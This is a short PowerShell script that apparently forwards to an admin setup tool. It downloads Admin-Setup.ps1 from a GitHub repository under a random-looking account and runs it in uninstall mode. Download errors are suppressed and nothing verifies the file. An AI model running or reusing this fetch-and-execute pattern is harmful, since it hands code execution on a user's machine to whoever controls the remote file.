# Forwards to the one script.
$dst = Join-Path $env:USERPROFILE 'admin\Admin-Setup.ps1'
New-Item -ItemType Directory -Force -Path (Split-Path $dst) | Out-Null
try { Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/e24g4vewetq3gwerb/Admin-setup/main/Admin-Setup.ps1' -OutFile $dst } catch {}
& $dst -Mode Uninstall
